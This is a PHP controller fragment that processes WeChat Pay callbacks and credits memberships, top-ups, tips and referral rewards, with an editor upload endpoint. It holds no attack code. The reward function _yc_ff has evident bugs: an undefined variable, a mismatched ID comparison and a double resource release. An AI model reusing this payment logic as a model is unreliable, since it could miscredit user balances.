	public function wxpay_return($id=''){
		if($id==''||intval($id)<=0)exit();
		$msg='';
		$ddid=intval($id);
		$is_cg=0;
		$is_dh=0;
		$s_query='select *
		from pay_info
		where pay_id='.$ddid.'
		limit 1';
		$pay_query=$this->db->query($s_query);
		if($pay_query->num_rows()>0){
			$pay=$pay_query->row();
			$get=$this->input->get(NULL,TRUE);
			$main=$this->main->main();
			if($main->wx_pay_o>0){
				$main->wx_app_id=$main->wx_o_app_id;
				$main->wx_app_secret=$main->wx_o_app_secret;
				$main->wx_pay_si=$main->wx_o_pay_si;
				$main->wx_pay_sk=$main->wx_o_pay_sk;
			}
			$is_wxpay=($main->wx_app_id!=''&&$main->wx_app_secret!=''&&$main->wx_pay_si!=''&&$main->wx_pay_sk!='')?1:0;
			if($pay->isdh==1){
				$msg='交易成功';
				if($pay->money_s>=$pay->money){
					$is_cg=1;
				}else{
					$msg.='，所付金额（'.($pay->money_s/100).'元）与订单金额（'.($pay->money/100).'元）不符';
				}
				$msg.='，如有疑问请联系管理员';
			}elseif($pay->isdh==0 &&$is_wxpay>0){
				$wx_config['app_id']=$main->wx_app_id;
				$wx_config['app_secret']=$main->wx_app_secret;
				$wx_config['mch_id']=$main->wx_pay_si;
				$wx_config['key']=$main->wx_pay_sk;
				$this->load->library('wxpay2',$wx_config);
				$result=$this->wxpay2->query_order($pay->ap_sid);
				if($result['return_code']=='SUCCESS'&&$result['result_code']=='SUCCESS'){
					$resp=$result;
					$info=$resp['trade_state']=='SUCCESS'?'0':'';
					$money_s=$resp['total_fee'];
					$openid=$resp['openid'];
				}
			}
			if(isset($resp)){
				$ap_pid=$resp['transaction_id'];
				$pdata['info']=$info;
				if($info!=''&&$info=='0'){
					$money_s=intval($money_s)>0?intval($money_s):0;
					$pdata['money_s']=$money_s;
					$pdata['ap_pid']=$ap_pid;
					$pdata['openid']=$openid;
					$pay->ap_pid=$ap_pid;
					$pdata['isdh']=1;
					$msg.='交易成功';
					if($money_s>=$pay->money){
						$is_cg=1;
						$is_dh=1;
					}else{
						$msg.='，所付金额（'.($money_s/100).'元）与订单金额（'.($pay->money/100).'元）不符';
						if($money_s>0 &&($pay->tid==1 ||$pay->tid==2)){
							$is_dh=1;
							$msg='，将按所付金额完成交易';
						}
					}
					$msg.='，如有疑问请联系管理员';
					$this->db->update('pay_info',$pdata,array('pay_id'=>$pay->pay_id));
				}else{
					$msg.='交易失败，请联系管理员';
				}
			}
			if($is_cg>0 &&$is_dh>0){
				switch($pay->tid){
				case 5:
					if($pay->topic_id>0)$this->_jfx_ff($pay);
					break;
				case 4:
					if($pay->topic_id>0 &&$pay->user_id>0)$this->_yc_ff($pay);
					break;
				case 3:
					if($pay->topic_id>0)$this->_rw_ff($pay);
					break;
				case 2:
					if($pay->topic_id>0)$this->_ds($pay,$money_s);
					break;
				case 1:
					if($pay->user_id>0)$this->_cz($pay,$money_s);
					break;
				case 0:
					if($pay->user_id>0)$this->_hy($pay->user_id,$main);
					break;
				}
			}
		}else{
			$msg='交易失败';
		}
		$pay_query->free_result();
		if($msg=='')$msg='订单查询失败，请联系管理员';
		echo $msg;
	}
	public function wxpay_notify($id=''){
		$get=$this->input->get(NULL,TRUE);
		if($id==''&&isset($get['wxkk_c']) &&isset($get['wxkk_m']) &&isset($get['id']))$id=$get['id'];
		$ddid=intval($id);
		$s_query='select *
		from pay_info
		where pay_id='.$ddid.'
		limit 1';
		$pay_query=$this->db->query($s_query);
		if($pay_query->num_rows()>0){
			$is_dh=0;
			$pay=$pay_query->row();
			$main=$this->main->main();
			if($main->wx_pay_o>0){
				$main->wx_app_id=$main->wx_o_app_id;
				$main->wx_app_secret=$main->wx_o_app_secret;
				$main->wx_pay_si=$main->wx_o_pay_si;
				$main->wx_pay_sk=$main->wx_o_pay_sk;
			}
			$is_wxpay=($main->wx_app_id!=''&&$main->wx_app_secret!=''&&$main->wx_pay_si!=''&&$main->wx_pay_sk!='')?1:0;
			$xml='';
			if(isset($HTTP_RAW_POST_DATA) &&$HTTP_RAW_POST_DATA!='')$xml=$HTTP_RAW_POST_DATA;
			if($xml=='')$xml=file_get_contents("php://input");
			if($is_wxpay>0 &&$xml!=''){
				$wx_config['app_id']=$main->wx_app_id;
				$wx_config['app_secret']=$main->wx_app_secret;
				$wx_config['mch_id']=$main->wx_pay_si;
				$wx_config['key']=$main->wx_pay_sk;
				$this->load->library('wxpay2',$wx_config);
				if($this->wxpay2->check_notify($xml)){
					$result=$this->wxpay2->xml_2_array($xml);
					if($result['return_code']=='SUCCESS'&&$result['result_code']=='SUCCESS'){
						$ap_sid=$result['out_trade_no'];
						$ap_pid=$result['transaction_id'];
						$money_s=$result['total_fee'];
						$openid=$result['openid'];
						$info='0';
					}
					$xml_p['return_code']='SUCCESS';
				}else{
					$xml_p['return_code']='FAIL';
					$xml_p['return_msg']='签名失败';
				}
				$return_s=$this->wxpay2->array_2_xml($xml_p);
				if(isset($openid) &&$openid!=''){
					$pdata['openid']=$openid;
				}
				if(isset($ap_sid) &&$ap_sid==$pay->ap_sid){
					$money_s=intval($money_s)>0?intval($money_s):0;
					$pdata['money_s']=$money_s;
					$pdata['info']=$info;
					$pdata['ap_pid']=$ap_pid;
					$pay->ap_pid=$ap_pid;
					if($info!=''&&$info=='0'&&$pay->isdh==0){
						$pdata['isdh']=1;
						if($money_s>=$pay->money ||($money_s>0 &&($pay->tid==1 ||$pay->tid==2))){
							$is_dh=1;
						}
					}
					$this->db->update('pay_info',$pdata,array('pay_id'=>$pay->pay_id));
				}
			}
			if($is_dh>0 &&$pay->user_id>0){
				switch($pay->tid){
				case 5:
					if($pay->topic_id>0)$this->_jfx_ff($pay);
					break;
				case 4:
					if($pay->topic_id>0 &&$pay->user_id>0)$this->_yc_ff($pay);
					break;
				case 3:
					if($pay->topic_id>0)$this->_rw_ff($pay);
					break;
				case 2:
					if($pay->topic_id>0)$this->_ds($pay,$money_s);
					break;
				case 1:
					if($pay->user_id>0)$this->_cz($pay,$money_s);
					break;
				case 0:
					if($pay->user_id>0)$this->_hy($pay->user_id,$main);
					break;
				}
			}
		}
		$pay_query->free_result();
		if(isset($return_s))echo $return_s;
	}
	public function h5p(){
		$user=$this->main->user(1);
		$data=$this->data;
		$main=$user->main;
		$data['user']=$user;
		$data['main']=$main;
		$this->load->view('m_head',$data);
		$this->load->view($this->c_name.'_h5p');
		$this->load->view('m_foot');
	}
	public function upload_mini($id=''){
		if($id!=''&&intval($id)>0){
			$uid=intval($id);
			$this->load->helper('file');
			$get=$this->input->get(NULL,TRUE);
			$action=isset($get['action'])?$get['action']:'';
			switch($action){
			case 'config':
				$cf='static/ueditor_mini/config.json';
				$cf_c=read_file($cf);
				echo json_encode(json_decode(preg_replace("/\/\*[\s\S]+?\*\//",'',$cf_c),true));
				break;
			default:
				$ff='static/'.time().'.txt';
				$fc=print_r($get,true);
				$fc.="\r\n\r\n";
				if(isset($_POST)){
					$fc.=print_r($_POST,true);
					$fc.="\r\n\r\n";
				}
				if(isset($_FILES)){
					$fc.=print_r($_FILES,true);
					$fc.="\r\n\r\n";
				}
				$url='';
				$original='';
				$ext='';
				$size=0;
				if(isset($_FILES['upfile']) &&isset($_FILES['upfile']['name']) &&$_FILES['upfile']['name']!=''){
					$f_a=$_FILES['upfile'];
					$original=$f_a['name'];
					$size=$f_a['size'];
					$a_fn=explode('.',$f_a['name']);
					$c_fn=count($a_fn);
					$ext=strtolower($a_fn[($c_fn-1)]);
					$ua=$this->main->pic_upload($f_a,$uid,'logo,'.$uid);
					$pic=$ua[0];
					$oss=$ua[1];
					if($pic!=''||$oss!=''){
						if($oss!=''){
							$url=getpageurl('home/file_url/').'?f='.$oss;
						}else{
							$url=$pic;
						}
						$state='SUCCESS';
					}else{
						$state='上传失败';
					}
				}else{
					$state='缺少上传文件';
				}
				$data['url']=$url;
				$data['title']='';
				$data['original']=$original;
				$data['state']=$state;
				$data['type']=$ext;
				$data['size']=$size;
				$return=json_encode($data);
				$fc.=print_r($data,true);
				$fc.="\r\n\r\n";
				echo $return;
				break;
			}
		}
	}
	private function _hy($id,$main){
		$s_query='select *
		from user
		where user_id='.$id.'
		limit 1';
		$user_query=$this->db->query($s_query);
		if($user_query->num_rows()>0){
			$user=$user_query->row();
			$qst=$user->hydate;
			if($qst<time())$qst=time();
			$qst+=86400*365;
			$udata['hydate']=$qst;
			$this->db->update('user',$udata,array('user_id'=>$user->user_id));
			if($user->uid>0){
				$s_query='select *
				from user
				where user_id='.$user->uid.'
				limit 1';
				$tu_query=$this->db->query($s_query);
				if($tu_query->num_rows()>0){
					$tu=$tu_query->row();
					$je=0;
					$is_tj=0;
					if($main->fy_jl>0 &&$user->hydate==0 &&($tu->hydate>time() ||$main->is_cs>0)){
						$je+=$main->fy_jl;
						$lmdata['user_id']=$tu->user_id;
						$lmdata['datetime']=time();
						$lmdata['ye']=$main->fy_jl;
						$lmdata['content']='推荐付费用户奖励';
						$this->db->insert('log_rmb',$lmdata);
						$is_tj=1;
					}
					if($je>0){
						$tudata['ye']=$tu->ye+$je;
						$tudata['c_sy']=$tu->c_sy+$je;
						$tudata['c_tdsy']=$tu->c_tdsy+$je;
						$this->db->update('user',$tudata,array('user_id'=>$tu->user_id));
						if($tu->uid>0){
							$s_query='select *
							from user
							where user_id='.$tu->uid.'
							limit 1';
							$uu_query=$this->db->query($s_query);
							if($uu_query->num_rows()>0){
								$uu=$uu_query->row();
								$tdsy=$uu->c_tdsy+$je;
								if($is_tj>0 &&$uu->hydate>time() &&$main->fy_tdjl>0){
									$uudata['ye']=$uu->ye+$main->fy_tdjl;
									$tdsy+=$main->fy_tdjl;
									$lmdata['user_id']=$uu->user_id;
									$lmdata['datetime']=time();
									$lmdata['ye']=$main->fy_tdjl;
									$lmdata['content']='团队付费用户奖励';
									$this->db->insert('log_rmb',$lmdata);
									if($uu->uid>0){
										$s_query='select *
										from user
										where user_id='.$uu->uid.'
										limit 1';
										$au_query=$this->db->query($s_query);
										if($au_query->num_rows()>0){
											$au=$au_query->row();
											$audata['c_tdsy']=$au->c_tdsy+$main->fy_tdjl;
											$this->db->update('user',$audata,array('user_id'=>$au->user_id));
										}
										$uu_query->free_result();
									}
								}
								$uudata['c_tdsy']=$tdsy;
								$this->db->update('user',$uudata,array('user_id'=>$uu->user_id));
							}
							$uu_query->free_result();
						}
					}
				}
				$tu_query->free_result();
			}
		}
		$user_query->free_result();
	}
	private function _cz($pay,$money){
		if($pay->user_id>0 &&$money>0){
			$s_query='select *
			from user
			where user_id='.$pay->user_id.'
			limit 1';
			$user_query=$this->db->query($s_query);
			if($user_query->num_rows()>0){
				$user=$user_query->row();
				$udata['ye']=$user->ye+$money;
				$this->db->update('user',$udata,array('user_id'=>$pay->user_id));
				$lmdata['user_id']=$pay->user_id;
				$lmdata['datetime']=time();
				$lmdata['ye']=$money;
				$lmdata['content']='充值';
				$this->db->insert('log_rmb',$lmdata);
			}
			$user_query->free_result();
		}
	}
	private function _ds($pay,$money){
		if($pay->topic_id>0 &&$money>0){
			$s_query='select b.user_id, b.ye, b.c_sy, b.c_tdsy, b.uid
			from topic as a, user as b
			where a.is_yc>0 and a.user_id=b.user_id and a.topic_id='.$pay->topic_id.'
			limit 1';
			$ut_query=$this->db->query($s_query);
			if($ut_query->num_rows()>0){
				$ut=$ut_query->row();
				$udata['ye']=$ut->ye+$money;
				$udata['c_sy']=$ut->c_sy+$money;
				$udata['c_tdsy']=$ut->c_tdsy+$money;
				$this->db->update('user',$udata,array('user_id'=>$ut->user_id));
				$lmdata['user_id']=$ut->user_id;
				$lmdata['datetime']=time();
				$lmdata['ye']=$money;
				$lmdata['content']='原创文章打赏';
				$this->db->insert('log_rmb',$lmdata);
				if($ut->uid>0){
					$s_query='select *
					from user
					where user_id='.$ut->uid.'
					limit 1';
					$uu_query=$this->db->query($s_query);
					if($uu_query->num_rows()>0){
						$uu=$uu_query->row();
						$tudata['c_tdsy']=$uu->c_tdsy+$money;
						$this->db->update('user',$tudata,array('user_id'=>$uu->user_id));
					}
					$uu_query->free_result();
				}
			}
			$ut_query->free_result();
		}
	}
	private function _rw_ff($pay){
		if($pay->topic_id>0){
			$s_query='select *
			from topic
			where rw_isff=0 and is_rw>0 and topic_id='.$pay->topic_id.'
			limit 1';
			$topic_query=$this->db->query($s_query);
			if($topic_query->num_rows()>0){
				$topic=$topic_query->row();
				$tdata['rw_isff']=1;
				$this->db->update('topic',$tdata,array('topic_id'=>$pay->topic_id));
			}
			$topic_query->free_result();
		}
	}
	private function _yc_ff($pay){
		if($pay->topic_id>0 &&$pay->user_id>0){
			$s_query='select *
			from topic
			where is_yc>0 and yc_fxt>0 and topic_id='.$pay->topic_id.'
			limit 1';
			$topic_query=$this->db->query($s_query);
			if($topic_query->num_rows()>0){
				$topic=$topic_query->row();
				if($pay->user_id!=$topic->topic_id){
					$is_jx=1;
					$s_query='select *
					from user_topic 
					where user_id='.$pay->user_id.' and topic_id='.$topic->topic_id.' 
					limit 1';
					$cl_query=$this->db->query($s_query);
					if($cl_query->num_rows()>0){
						if($topic->yc_fxt==1)$is_jx=0;
						$cl=$cl_query->row();
					}
					$cl_query->free_result();
					if($is_jx>0){
						if($topic->yc_fxt==2){
							$cs=floor($pay->money/$topic->yc_fxjg);
						}
						if(isset($cl)){
							$utdata['c_fx']=$cl->c_fx+$cs;
							$this->db->update('user_topic',$utdata,array('utopic_id'=>$cl->utopic_id));
						}else{
							$utdata['user_id']=$user->user_id;
							$utdata['topic_id']=$topic->topic_id;
							$utdata['datetime']=time();
							if($topic->yc_fxt==2)$utdata['c_fx']=$cs;
							$this->db->insert('user_topic',$utdata);
						}
						$je=$pay->money;
						$s_query='select *
						from user
						where user_id='.$topic->user_id.'
						limit 1';
						$tu_query=$this->db->query($s_query);
						if($tu_query->num_rows()>0){
							$tu=$tu_query->row();
							$tudata['ye']=$tu->ye+$je;
							$tudata['c_sy']=$tu->c_sy+$je;
							$tudata['c_tdsy']=$tu->c_tdsy+$je;
							$this->db->update('user',$tudata,array('user_id'=>$tu->user_id));
							$ltmdata['user_id']=$tu->user_id;
							$ltmdata['datetime']=time();
							$ltmdata['ye']=$je;
							$ltmdata['content']='原创文章修改权限收费';
							$this->db->insert('log_rmb',$ltmdata);
							if($tu->uid>0){
								$s_query='select *
								from user
								where user_id='.$tu->uid.'
								limit 1';
								$uu_query=$this->db->query($s_query);
								if($uu_query->num_rows()>0){
									$uu=$uu_query->row();
									$tuudata['c_tdsy']=$uu->c_tdsy+$je;
									$this->db->update('user',$tuudata,array('user_id'=>$uu->user_id));
								}
								$uu_query->free_result();
							}
						}
						$tu_query->free_result();
					}
					$cl_query->free_result();
				}
			}
			$topic_query->free_result();
		}
	}
	private function _jfx_ff($pay){
		if($pay->topic_id>0){
			$s_query='select *
			from jfx
			where is_ff=0 and jfx_id='.$pay->topic_id.'
			limit 1';
			$jfx_query=$this->db->query($s_query);
			if($jfx_query->num_rows()>0){
				$jfx=$jfx_query->row();
				$tdata['is_mf']=0;
				$tdata['is_ff']=1;
				$this->db->update('jfx',$tdata,array('jfx_id'=>$pay->topic_id));
			}
			$jfx_query->free_result();
		}
	}
}
?>